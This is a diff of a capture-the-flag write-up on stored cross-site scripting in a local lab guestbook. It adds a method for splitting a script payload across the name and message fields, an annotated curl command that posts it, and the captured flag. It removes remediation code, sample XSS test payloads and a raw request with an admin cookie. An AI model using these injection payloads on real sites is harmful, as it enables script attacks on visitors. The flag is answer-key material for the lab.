@@ -1,23 +1,43 @@
 # Cross-Site Scripting (XSS)
 
 ## Vulnerability Type
+
 **OWASP A03:2021 - Injection** (CWE-79: Improper Neutralization of Input During Web Page Generation)
 
 page: `http://localhost:8081/index.php?page=feedback`
-commands: In the guestbook form, enter in the **Name** field:
+
+Need to split the malicious payload between text fields:
 
 ```txt
-test
-# and in the **Message** field:
-<script>alert("XSS")</script>
-```
+<script>al → Fills the name input field.
+ert('XSS')</script> → Fills the message text area.
 
-Or via curl:
+
+## with curl
+The -X flag specifies the HTTP request method (POST in this case).
+When you use the -d flag, curl is smart enough to automatically change the method to POST. So the -X POST part is technically optional, but I will leave it in for readability
+The -d flag stands for Data (specifically, HTTP POST data). -d glues all the inputs together into a single line using ampersands (&). curl formats the request as application/x-www-form-urlencoded by default.
 
 ```bash
 curl -X POST "http://localhost:8081/index.php?page=feedback" \
      -d "txtName=%3Cscript%3Eal&mtxtMessage=ert%28%27XSS%27%29%3C%2Fscript%3E&btnSign=Sign+Guestbook" | grep flag
 ```
+
+If we decode the -d string, it looks like this:
+
+```txt
+txtName=<script>al → Fills the name input field.
+
+& → Separator.
+
+mtxtMessage=ert('XSS')</script> → Fills the message text area.
+
+& → Separator.
+
+btnSign=Sign Guestbook → Simulates clicking the "Sign Guestbook" submit button.
+```
+
+When the server receives this, it glues txtName and mtxtMessage together on the page. Because we split the javascript `<script>alert('XSS')</script>` between the two fields, when the page renders them side-by-side, they combine into a single, malicious Cross-Site Scripting (XSS) payload.
 
 ## Details
 
@@ -31,7 +51,7 @@ This is a **Stored XSS** (also called Persistent XSS). There are 3 types:
 
 This guestbook is **Stored XSS** because the `<script>` tag is saved in the database and rendered for every visitor who loads the page.
 
-I entered a <script>alert("XSS")</script in the comment box and got the flag
+I entered a `<script>alert("XSS")</script` in the comment box and got the flag
 
 The flag is : 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
 
@@ -46,55 +66,14 @@ The flag is : 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
 ## Remediation
 
 1. **Output encoding** – Always HTML-encode user input before rendering:
-
-```php
-echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
-```
-
 This converts `<script>` to `&lt;script&gt;` so browsers render it as text, not code.
 
 2. **Input validation** – Whitelist allowed characters (alphanumeric, spaces, basic punctuation):
 
-```php
-if (!preg_match('/^[a-zA-Z0-9\s.,!?-]+$/', $input)) {
-     die('Invalid input');
-}
-```
-
-3. **Content Security Policy (CSP)** – Add HTTP header to block inline
-scripts:
-```
-Content-Security-Policy: default-src 'self'; script-src 'self'
-```
+3. **Content Security Policy (CSP)** – Add HTTP header to block inline scripts:
 
 4. **Use templating engines** – Modern frameworks (Twig, Vue, React) auto-escape by default
 
 5. **Filter on input, encode on output** – Accept any input, but sanitize when rendering
 
 6. **Regular security testing** – Scan for XSS payloads:
-   ```
-   <img src=x onerror=alert(1)>
-   <svg onload=alert(1)>
-   javascript:alert(1)
-   ```
-POST /index.php?page=feedback HTTP/1.1
-Host: localhost:8081
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 91
-Origin: http://localhost:8081
-Connection: keep-alive
-Referer: http://localhost:8081/index.php?page=feedback
-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-Priority: u=0, i
-
-txtName=%3Cscript%3Eal&mtxtMessage=ert%28%27XSS%27%29%3C%2Fscript%3E&btnSign=Sign+Guestbook
-
